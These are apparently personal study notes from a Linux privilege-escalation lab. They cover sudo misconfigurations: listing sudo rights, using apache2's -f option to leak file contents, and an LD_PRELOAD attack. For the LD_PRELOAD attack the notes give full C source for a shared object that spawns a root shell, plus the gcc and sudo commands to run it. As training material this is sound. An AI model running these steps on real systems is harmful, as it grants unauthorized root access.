System administrator may give sudo permission to a single tools like nmap so we can use this to gain access.

check which tools can run with permission

```bash
sudo -l
```

we can use this to check more about [suid](https://gtfobins.github.io/)

**Leverage application functions**

Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server.

In this case, we can use a "hack" to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files (`-f` : specify an alternate ServerConfigFile).

![](Pasted%20image%2020250702221141.png)

```bash
apache2 -f /path/to/malicious_config.conf
```

if we import non-apache file it will show error but add first line as erro message from file.

**Leverage LD_PRELOAD**

On some systems, you may see the LD_PRELOAD environment option.

![](https://i.imgur.com/gGstS69.png)  

LD_PRELOAD is a function that allows any program to use shared libraries. This [blog post](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/)  If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.

1. Check for LD_PRELOAD (with the env_keep option)
2. Write a simple C code compiled as a share object (.so extension) file
3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows;

```c
#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
void _init() {  
unsetenv("LD_PRELOAD");  
setgid(0);  
setuid(0);  
system("/bin/bash");  
}  
```

We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;

```c
gcc shell.c
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

![](https://i.imgur.com/HxbszMW.png)  

We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.

We need to run the program by specifying the LD_PRELOAD option

```c
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

This will result in a shell spawn with root privileges.

![](https://i.imgur.com/1YwARyZ.png)

